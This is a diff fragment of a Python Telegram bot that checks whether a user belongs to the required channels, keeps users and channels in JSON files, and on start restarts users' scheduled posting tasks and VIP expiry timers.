+
+async def subscription(message: Message):
+    user_id = message.from_user.id
+    for channel in channels:
+        try: await app.get_chat_member(channel, user_id)
+        except UserNotParticipant: return channel
+    return True
+
+
+def write(fp, data):
+    with open(fp, "w") as file:
+        json.dump(data, file, indent=2)
+
+
+def read(fp):
+    if not os.path.exists(fp):
+        write(fp, {} if fp not in [channels_db] else [])
+    with open(fp) as file:
+        data = json.load(file)
+    return data
+
+
+users_db = "users.json"
+channels_db = "channels.json"
+users = read(users_db)
+channels = read(channels_db)
+
+
+async def reStartPosting():
+    await sleep(30)
+    for user in users:
+        if users[user].get("posting"): create_task(posting(user))
+
+
+async def reVipTime():
+    for user in users:
+        if int(user) == owner: continue
+        if users[user]["vip"]: create_task(vipCanceler(int(user)))
+
+
+async def main():
+    create_task(reStartPosting())
+    create_task(reVipTime())
+    await app.start()
+    await idle()
+
+
+if __name__=="__main__":
+    loop.run_until_complete(main())
